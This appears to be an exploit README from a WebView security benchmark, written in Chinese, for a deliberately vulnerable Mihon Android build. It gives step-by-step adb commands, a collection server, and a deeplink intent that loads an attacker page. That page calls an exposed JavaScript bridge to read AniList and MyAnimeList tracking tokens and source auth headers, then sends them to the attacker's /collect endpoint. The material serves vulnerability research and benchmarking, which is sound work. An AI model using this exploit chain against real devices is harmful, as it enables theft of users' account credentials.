# 1.1 Improper Exposure of JavaScript Bridge EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 将外部 URL 交给 `WebViewActivity` 加载。漏洞样本将 `window.mihonAndroidBridge` 注入到所有页面，未校验页面来源。任意攻击者页面均可调用 bridge 中的敏感方法窃取数据。

恶意页面依次调用：
- `window.mihonAndroidBridge.getTrackToken(service)` — 获取追踪服务 Token
- `window.mihonAndroidBridge.getTrackAuthHeader(service)` — 获取追踪服务认证头
- `window.mihonAndroidBridge.getSourceAuthHeader()` — 获取源站认证头

并通过 `/collect?d=<data>` 回传至攻击服务器。

## 前置条件

1. 连接 MuMu 模拟器：

```powershell
adb connect 127.0.0.1:7555
```

2. 安装漏洞 APK（`apk/mihon-0.19.9/vuln/1.1.apk`）：

```powershell
adb -s 127.0.0.1:7555 install apk\mihon-0.19.9\vuln\1.1.apk
```

## 运行服务端

```powershell
cd "d:\Secsys\Webview Benchmark&自动化挖掘\Phrase 6\WebviewBench\exp\mihon-0.19.9\1.1_Improper_Exposure_of_JavaScript_Bridge"
python .\server.py
```

服务端监听 `0.0.0.0:8000`，攻击页面路径：`http://10.0.2.2:8000/exp/1.1`

回收数据写入 `received/collected_<timestamp>.txt`。

## 触发 exploit

```powershell
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fexp%2F1.1"
```

## 预期结果

WebView 加载攻击页面后自动调用 bridge 并回传数据。`received/` 目录中出现文件，包含：
- `trackToken_anilist`、`trackToken_myanimelist`
- `trackAuth_anilist`、`trackAuth_myanimelist`
- `sourceAuthHeader`
- `availableServices`
